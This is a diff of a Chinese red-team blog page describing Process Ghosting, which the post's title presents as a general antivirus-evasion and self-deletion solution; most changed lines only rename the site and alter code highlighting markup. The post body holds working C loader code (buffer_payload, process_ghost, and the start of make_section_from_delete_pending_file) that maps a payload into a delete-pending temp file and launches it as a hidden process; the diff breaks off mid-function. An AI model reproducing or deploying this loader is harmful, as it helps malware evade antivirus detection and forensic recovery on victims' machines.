@@ -16,15 +16,15 @@
     <meta name="renderer" content="webkit">
     <meta name="copyright" content="JD.Army">
     
-        <meta name="keywords" content="JD.Army">
+        <meta name="keywords" content="Blog.JD.Army">
     
     <meta name="description" content="Red team of jd inc. ">
-    <meta name="description" content="声明本文来自项目https:&#x2F;&#x2F;github.com&#x2F;hasherezade&#x2F;process_ghosting 参考自https:&#x2F;&#x2F;www.elastic.co&#x2F;blog&#x2F;process-ghosting-a-new-executable-image-tampering-attack 前置知识一、Windows如何启动一个进程1、启动可执行文件的句柄，&#96;hFile &#x3D; CreateFile(“C">
+    <meta name="description" content="声明本文来自项目https:&#x2F;&#x2F;github.com&#x2F;hasherezade&#x2F;process_ghosting 参考自https:&#x2F;&#x2F;www.elastic.co&#x2F;blog&#x2F;process-ghosting-a-new-executable-image-tampering-attack 前置知识一、Windows如何启动一个进程1、启动可执行文件的句柄，&#96;hFile &#x3D; Crea">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ProcessGhosting - 一套通用的免杀，自删除解决方案">
-<meta property="og:url" content="https://jd.army/2021/07/23/processghosting-%E4%B8%80%E5%A5%97%E9%80%9A%E7%94%A8%E7%9A%84%E5%85%8D%E6%9D%80%EF%BC%8C%E8%87%AA%E5%88%A0%E9%99%A4%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/index.html">
-<meta property="og:site_name" content="JD.Army">
-<meta property="og:description" content="声明本文来自项目https:&#x2F;&#x2F;github.com&#x2F;hasherezade&#x2F;process_ghosting 参考自https:&#x2F;&#x2F;www.elastic.co&#x2F;blog&#x2F;process-ghosting-a-new-executable-image-tampering-attack 前置知识一、Windows如何启动一个进程1、启动可执行文件的句柄，&#96;hFile &#x3D; CreateFile(“C">
+<meta property="og:url" content="https://blog.jd.army/2021/07/23/processghosting-%E4%B8%80%E5%A5%97%E9%80%9A%E7%94%A8%E7%9A%84%E5%85%8D%E6%9D%80%EF%BC%8C%E8%87%AA%E5%88%A0%E9%99%A4%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/index.html">
+<meta property="og:site_name" content="Blog.JD.Army">
+<meta property="og:description" content="声明本文来自项目https:&#x2F;&#x2F;github.com&#x2F;hasherezade&#x2F;process_ghosting 参考自https:&#x2F;&#x2F;www.elastic.co&#x2F;blog&#x2F;process-ghosting-a-new-executable-image-tampering-attack 前置知识一、Windows如何启动一个进程1、启动可执行文件的句柄，&#96;hFile &#x3D; Crea">
 <meta property="og:locale">
 <meta property="og:image" content="https://firewore.oss-cn-beijing.aliyuncs.com/imgs/20211105095227.png">
 <meta property="article:published_time" content="2021-07-23T07:50:18.000Z">
@@ -38,7 +38,7 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
     
-    <title>ProcessGhosting - 一套通用的免杀，自删除解决方案 · JD.Army</title>
+    <title>ProcessGhosting - 一套通用的免杀，自删除解决方案 · Blog.JD.Army</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -215,7 +215,7 @@
     
     <!-- 谷歌统计  -->
     
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
     <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
     <script type="text/javascript">
@@ -251,7 +251,7 @@
         </span>
         <!-- back to home page text -->
         <span class="home-link header-element">
-            <a href=/>JD.Army</a>
+            <a href=/>Blog.JD.Army</a>
         </span>
     </div>
     <!-- toggle banner for post layout -->
@@ -260,7 +260,7 @@
             <div class="banner">
         
             <div class="blog-title header-element">
-                <a href="/">JD.Army</a>
+                <a href="/">Blog.JD.Army</a>
             </div>
             <div class="post-title header-element">
                 <a href="#" class="post-name">ProcessGhosting - 一套通用的免杀，自删除解决方案</a>
@@ -513,10 +513,10 @@
     <article class="article-entry">
         <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>本文来自项目<a target="_blank" rel="noopener" href="https://github.com/hasherezade/process_ghosting">https://github.com/hasherezade/process_ghosting</a></p>
 <p>参考自<a target="_blank" rel="noopener" href="https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack">https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack</a></p>
-<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="一、Windows如何启动一个进程"><a href="#一、Windows如何启动一个进程" class="headerlink" title="一、Windows如何启动一个进程"></a>一、Windows如何启动一个进程</h3><p>1、启动可执行文件的句柄，`hFile = CreateFile(“C:\Windows\System32\svchost.exe”)``</p>
-<p>2、创建一个section，将exe映射进这个section，hSection = NtCreateSection(hFile, SEC_IMAGE)</p>
-<p>3、使用这个session创建一个进程，hProcess = NtCreateProcessEx(hSection)</p>
-<p>4、分配参数和环境变量，CreateEnvironmentBlock/NtWriteVirtualMemory</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="一、Windows如何启动一个进程"><a href="#一、Windows如何启动一个进程" class="headerlink" title="一、Windows如何启动一个进程"></a>一、Windows如何启动一个进程</h3><p>1、启动可执行文件的句柄，&#96;hFile &#x3D; CreateFile(“C:\Windows\System32\svchost.exe”)&#96;&#96;</p>
+<p>2、创建一个section，将exe映射进这个section，hSection &#x3D; NtCreateSection(hFile, SEC_IMAGE)</p>
+<p>3、使用这个session创建一个进程，hProcess &#x3D; NtCreateProcessEx(hSection)</p>
+<p>4、分配参数和环境变量，CreateEnvironmentBlock&#x2F;NtWriteVirtualMemory</p>
 <p>5、创建一个线程并执行，NtCreateThreadEx</p>
 <h3 id="二、windows删除文件方法"><a href="#二、windows删除文件方法" class="headerlink" title="二、windows删除文件方法"></a>二、windows删除文件方法</h3><p>1、在设置的 FILE_SUPERSEDE[1]或者CREATE_ALWAYS[2] 标志的旧文件上创建一个新文件。</p>
 <p>2、创建或者打开文件时设置FILE_DELETE_ON_CLOSE[3]或者FILE_FLAG_DELETE_ON_CLOSE[4]。</p>
@@ -536,15 +536,15 @@
 <p>其中主要涉及到三个函数分别是buffer_payload、process_ghost、make_section_from_delete_pending_file。</p>
 <p><strong>buffer_payload</strong></p>
 <p>它的主要作用是打开black exe文件句柄，并将black exe映射进内存，但是不执行后续的启动process操作。而后将exe映射进内存中的数据以指针的形式返回。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-function">BYTE* <span class="hljs-title">buffer_payload</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span> *filename, OUT <span class="hljs-keyword">size_t</span> &amp;r_size)</span> </span>&#123;<br>    HANDLE file = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-number">0</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-number">0</span>);<span class="hljs-comment">//获取文件handle</span><br>    <span class="hljs-keyword">if</span> (file == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;create file fail!\n&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    HANDLE mapping = CreateFileMapping(file, <span class="hljs-number">0</span>, PAGE_READONLY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">//打开或创建文件的映射对象，返回值为新创建的文件映射handle</span><br>    <span class="hljs-keyword">if</span> (!mapping) &#123;<br>        CloseHandle(file);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;create map fail!\n&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    BYTE* dllRawData = (BYTE*)MapViewOfFile(mapping, FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//将文件映射handle映射到进程空间</span><br>    <span class="hljs-keyword">if</span> (dllRawData == <span class="hljs-literal">nullptr</span>) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;map move fail!\n&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        CloseHandle(mapping);<br>        CloseHandle(file);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    &#125;<br>    r_size = GetFileSize(file, <span class="hljs-number">0</span>);<br>    BYTE* localCopyAddress = (BYTE*)VirtualAlloc(<span class="hljs-literal">NULL</span>, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<span class="hljs-comment">//内存中申请文件大小的地址空间</span><br>    <span class="hljs-built_in">memcpy</span>(localCopyAddress, dllRawData, r_size);<br>    UnmapViewOfFile(dllRawData);<span class="hljs-comment">//解映射</span><br>    CloseHandle(mapping);<br>    CloseHandle(file);<br>    <span class="hljs-keyword">return</span> localCopyAddress;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs C">BYTE* <span class="hljs-title function_">buffer_payload</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span> *filename, OUT <span class="hljs-type">size_t</span> &amp;r_size)</span> &#123;<br>    HANDLE file = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, <span class="hljs-number">0</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="hljs-number">0</span>);<span class="hljs-comment">//获取文件handle</span><br>    <span class="hljs-keyword">if</span> (file == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;create file fail!\n&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    HANDLE mapping = CreateFileMapping(file, <span class="hljs-number">0</span>, PAGE_READONLY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">//打开或创建文件的映射对象，返回值为新创建的文件映射handle</span><br>    <span class="hljs-keyword">if</span> (!mapping) &#123;<br>        CloseHandle(file);<br>        <span class="hljs-keyword">return</span> nullptr;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;create map fail!\n&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br>    BYTE* dllRawData = (BYTE*)MapViewOfFile(mapping, FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//将文件映射handle映射到进程空间</span><br>    <span class="hljs-keyword">if</span> (dllRawData == nullptr) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;map move fail!\n&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        CloseHandle(mapping);<br>        CloseHandle(file);<br>        <span class="hljs-keyword">return</span> nullptr;<br>    &#125;<br>    r_size = GetFileSize(file, <span class="hljs-number">0</span>);<br>    BYTE* localCopyAddress = (BYTE*)VirtualAlloc(<span class="hljs-literal">NULL</span>, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<span class="hljs-comment">//内存中申请文件大小的地址空间</span><br>    <span class="hljs-built_in">memcpy</span>(localCopyAddress, dllRawData, r_size);<br>    UnmapViewOfFile(dllRawData);<span class="hljs-comment">//解映射</span><br>    CloseHandle(mapping);<br>    CloseHandle(file);<br>    <span class="hljs-keyword">return</span> localCopyAddress;<br><br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p><strong>process_ghost</strong></p>
 <p>这个函数的主要作用是进行启动进程的操作。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs C"><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">process_ghost</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* targetPath, BYTE* payladBuf, DWORD payloadSize)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">wchar_t</span> dummy_name[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">wchar_t</span> temp_path[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    DWORD size = GetTempPathW(MAX_PATH, temp_path);<span class="hljs-comment">//获取temp文件路径</span><br>    GetTempFileNameW(temp_path, <span class="hljs-string">L&quot;TH&quot;</span>, <span class="hljs-number">0</span>, dummy_name);<span class="hljs-comment">//给temp文件创建一个名称</span><br><br>    HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);<span class="hljs-comment">//将temp文件属性设置为删除状态，并将文件映射进section</span><br>    <span class="hljs-keyword">if</span> (!hSection || hSection == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    HANDLE hProcess = <span class="hljs-literal">nullptr</span>;<br>    NTSTATUS status = NtCreateProcessEx(<br>        &amp;hProcess,<br>        PROCESS_ALL_ACCESS,<br>        <span class="hljs-literal">NULL</span>,<br>        NtCurrentProcess(),<br>        PS_INHERIT_HANDLES,<br>        hSection,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        FALSE<br>    );<span class="hljs-comment">//根据传入的section创建process</span><br>    <span class="hljs-keyword">if</span> (status != STATUS_SUCCESS) &#123;<br>        <span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;NtCreateProcessEx failed! Status: &quot;</span> &lt;&lt; hex &lt;&lt; status &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">if</span> (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) &#123;<br>            <span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;[!] The payload has mismatching bitness!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    PROCESS_BASIC_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>    DWORD ReturnLength = <span class="hljs-number">0</span>;<br>    status = NtQueryInformationProcess(<br>        hProcess,<br>        ProcessBasicInformation,<br>        &amp;pi,<br>        <span class="hljs-keyword">sizeof</span>(PROCESS_BASIC_INFORMATION),<br>        &amp;ReturnLength<br>    );<span class="hljs-comment">//索引创建的进程基础信息</span><br>    <span class="hljs-keyword">if</span> (status != STATUS_SUCCESS) &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;NtQueryInformationProcess failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    PEB peb_copy = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (!buffer_remote_peb(hProcess, pi, peb_copy)) &#123;<span class="hljs-comment">//将black exe的内存数据复制到peb_copy，主要作用是获取ImageBaseAddress</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    ULONGLONG imageBase = (ULONGLONG)peb_copy.ImageBaseAddress;<br>    DWORD payload_ep = get_entry_point_rva(payladBuf);<span class="hljs-comment">//获取入口点的偏移地址</span><br>    ULONGLONG procEntry = payload_ep + imageBase;<span class="hljs-comment">//获取到入口点的地址</span><br>    <span class="hljs-keyword">if</span> (!setup_process_parameters(hProcess, pi, targetPath)) &#123;<span class="hljs-comment">//将环境变量写入进程的内存空间，此处是唯一一次用到white exe的地方:)</span><br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;Parameters setup failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br>    status = NtCreateThreadEx(&amp;hThread,<br>        THREAD_ALL_ACCESS,<br>        <span class="hljs-literal">NULL</span>,<br>        hProcess,<br>        (LPTHREAD_START_ROUTINE)procEntry,<br>        <span class="hljs-literal">NULL</span>,<br>        FALSE,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-literal">NULL</span><br>    );<span class="hljs-comment">//在进程中black exe内存的入口点创建线程</span><br><br>    <span class="hljs-keyword">if</span> (status != STATUS_SUCCESS) &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;NtCreateThreadEx failed: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs C"><br><span class="hljs-type">bool</span> <span class="hljs-title function_">process_ghost</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span>* targetPath, BYTE* payladBuf, DWORD payloadSize)</span><br>&#123;<br>    <span class="hljs-type">wchar_t</span> dummy_name[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-type">wchar_t</span> temp_path[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    DWORD size = GetTempPathW(MAX_PATH, temp_path);<span class="hljs-comment">//获取temp文件路径</span><br>    GetTempFileNameW(temp_path, <span class="hljs-string">L&quot;TH&quot;</span>, <span class="hljs-number">0</span>, dummy_name);<span class="hljs-comment">//给temp文件创建一个名称</span><br><br>    HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);<span class="hljs-comment">//将temp文件属性设置为删除状态，并将文件映射进section</span><br>    <span class="hljs-keyword">if</span> (!hSection || hSection == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    HANDLE hProcess = nullptr;<br>    NTSTATUS status = NtCreateProcessEx(<br>        &amp;hProcess,<br>        PROCESS_ALL_ACCESS,<br>        <span class="hljs-literal">NULL</span>,<br>        NtCurrentProcess(),<br>        PS_INHERIT_HANDLES,<br>        hSection,<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-literal">NULL</span>,<br>        FALSE<br>    );<span class="hljs-comment">//根据传入的section创建process</span><br>    <span class="hljs-keyword">if</span> (status != STATUS_SUCCESS) &#123;<br>        <span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;NtCreateProcessEx failed! Status: &quot;</span> &lt;&lt; hex &lt;&lt; status &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">if</span> (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) &#123;<br>            <span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;[!] The payload has mismatching bitness!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    PROCESS_BASIC_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>    DWORD ReturnLength = <span class="hljs-number">0</span>;<br>    status = NtQueryInformationProcess(<br>        hProcess,<br>        ProcessBasicInformation,<br>        &amp;pi,<br>        <span class="hljs-keyword">sizeof</span>(PROCESS_BASIC_INFORMATION),<br>        &amp;ReturnLength<br>    );<span class="hljs-comment">//索引创建的进程基础信息</span><br>    <span class="hljs-keyword">if</span> (status != STATUS_SUCCESS) &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;NtQueryInformationProcess failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    PEB peb_copy = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (!buffer_remote_peb(hProcess, pi, peb_copy)) &#123;<span class="hljs-comment">//将black exe的内存数据复制到peb_copy，主要作用是获取ImageBaseAddress</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    ULONGLONG imageBase = (ULONGLONG)peb_copy.ImageBaseAddress;<br>    DWORD payload_ep = get_entry_point_rva(payladBuf);<span class="hljs-comment">//获取入口点的偏移地址</span><br>    ULONGLONG procEntry = payload_ep + imageBase;<span class="hljs-comment">//获取到入口点的地址</span><br>    <span class="hljs-keyword">if</span> (!setup_process_parameters(hProcess, pi, targetPath)) &#123;<span class="hljs-comment">//将环境变量写入进程的内存空间，此处是唯一一次用到white exe的地方:)</span><br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;Parameters setup failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br>    status = NtCreateThreadEx(&amp;hThread,<br>        THREAD_ALL_ACCESS,<br>        <span class="hljs-literal">NULL</span>,<br>        hProcess,<br>        (LPTHREAD_START_ROUTINE)procEntry,<br>        <span class="hljs-literal">NULL</span>,<br>        FALSE,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-literal">NULL</span><br>    );<span class="hljs-comment">//在进程中black exe内存的入口点创建线程</span><br><br>    <span class="hljs-keyword">if</span> (status != STATUS_SUCCESS) &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;NtCreateThreadEx failed: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p><strong>make_section_from_delete_pending_file</strong></p>
 <p>其中，设置temp文件为删除状态，并将black exe的内存映射到temp文件。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs C"><br><span class="hljs-function">HANDLE <span class="hljs-title">make_section_from_delete_pending_file</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* filePath, BYTE* payladBuf, DWORD payloadSize)</span> </span>&#123;<br>    HANDLE hDelFile = open_file(filePath);<span class="hljs-comment">//打开temp文件</span><br>    NTSTATUS status = <span class="hljs-number">0</span>;<br>    IO_STATUS_BLOCK status_block = &#123; <span class="hljs-number">0</span> &#125;;<br><br>    FILE_DISPOSITION_INFORMATION info = &#123; <span class="hljs-number">0</span> &#125;;<br>    info.DeleteFile = TRUE;<br>    status = NtSetInformationFile(hDelFile, &amp;status_block, &amp;info, <span class="hljs-keyword">sizeof</span>(info), FileDispositionInformation);<span class="hljs-comment">//改变文件对象信息，将设置为请求删除文件状态。</span><br>    <span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Setting information failed: &quot;</span> &lt;&lt; hex &lt;&lt; status &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> INVALID_HANDLE_VALUE;<br>    &#125;<br>    